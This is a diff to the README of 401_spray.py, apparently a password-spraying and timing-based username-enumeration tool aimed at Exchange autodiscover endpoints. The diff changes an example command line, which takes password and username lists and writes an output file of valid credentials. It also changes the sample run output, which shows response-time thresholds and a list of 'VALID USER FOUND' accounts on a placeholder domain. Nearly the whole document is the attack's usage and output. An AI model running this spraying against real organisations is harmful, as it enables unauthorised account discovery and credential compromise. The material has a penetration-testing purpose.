@@ -38,20 +38,29 @@ optional arguments:
 
 Example output:
 ```Python
-./401_spray.py -v -U https://autodiscover.<target>.com/autodiscover/autodiscover.xml -p /users/bortiz/Documents/Projects/passwords.txt -u /users/bortiz/Documents/Projects/user_names.txt -t 100 -o /users/bortiz/Documents/Projects/valid_creds.txt
+./401_spray.py -v -U https://autodiscover.<target>/autodiscover/autodiscover.xml -p /users/bortiz/Documents/Projects/passwords.txt -u /users/bortiz/Documents/Projects/user_names.txt -t 50 -o /users/bortiz/Documents/Projects/valid_creds.txt -i 60 
 
 New password spraying run
-Spraying 1 passwords, then sleeping for 120.
-URL: https://autodiscover.<target>.com/autodiscover/autodiscover.xml
-[+] Domain Found: <target>
+Spraying 1 passwords, then sleeping for 60.
+URL: https://autodiscover.<target>/autodiscover/autodiscover.xml
 [*] Performing incorrect Domain Test
-[+] auth creds: random\aaaaaaz, time elapsed: 0:00:05.048192
-[+] auth creds: anything1\bbbbbbz, time elapsed: 0:00:00.309263
-[+] auth creds: bread_man\ccccccz, time elapsed: 0:00:00.379083
+[+] auth creds: random\aaaaaaz, time elapsed: 0:00:00.384964
+[+] auth creds: anything1\bbbbbbz, time elapsed: 0:00:00.372382
+[+] auth creds: bread_man\ccccccz, time elapsed: 0:00:04.997914
+[*] Performing correct Username & Domain Test
+[+] auth creds: domain\Guest, time elapsed: 0:00:00.373984
+[+] auth creds: domain\Administrator, time elapsed: 0:00:00.374277
+[+] auth creds: domain\krbtgt, time elapsed: 0:00:00.371279
 [*] Performing incorrect Username Test
-[+] auth creds: <target>\aaaaaaz, time elapsed: 0:00:07.880553
-[+] auth creds: <target>\bbbbbbz, time elapsed: 0:00:03.642619
-[+] auth creds: <target>\ccccccz, time elapsed: 0:00:03.653361
-[+] Avg time: 0:00:05.058844
-[*] Threshold: 0:00:03.035306
+[+] auth creds: domain\aaaaaaz, time elapsed: 0:00:15.357264
+[+] auth creds: domain\bbbbbbz, time elapsed: 0:00:10.670948
+[+] auth creds: domain\ccccccz, time elapsed: 0:00:15.460272
+[+] Avg time: 0:00:13.829495
+[*] Threshold: 0:00:08.297697
+[+] VALID USER FOUND: domain\JS2563, time elapsed: 0:00:00.522217
+[+] VALID USER FOUND: domain\JS2661, time elapsed: 0:00:00.404065
+[+] VALID USER FOUND: domain\JS2756, time elapsed: 0:00:00.430944
+[+] VALID USER FOUND: domain\JS4491, time elapsed: 0:00:00.422542
+[+] VALID USER FOUND: domain\JS4541, time elapsed: 0:00:00.411033
+[+] VALID USER FOUND: domain\JS5517, time elapsed: 0:00:00.642477
 ```
